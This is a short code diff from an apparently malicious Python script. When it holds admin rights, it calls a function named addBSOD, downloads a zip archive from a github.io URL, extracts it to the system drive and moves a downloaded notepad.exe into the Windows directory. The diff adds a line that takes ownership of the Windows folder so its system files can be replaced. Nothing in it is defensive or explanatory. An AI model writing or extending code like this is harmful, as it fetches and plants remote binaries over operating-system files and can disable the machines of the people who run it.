@@ -53,6 +53,7 @@ if is_admin():
     addBSOD()
 
 
+    getOwnerShip(default_disk + "\\Windows")
     pathdownloaded = DownloadFile('https://psvks.github.io/psvks/uploads/output.zip')
     ExtractZip(pathdownloaded, default_disk)
     MoveFile(default_disk + "\\output\\notepad.exe", default_disk + "\\Windows")
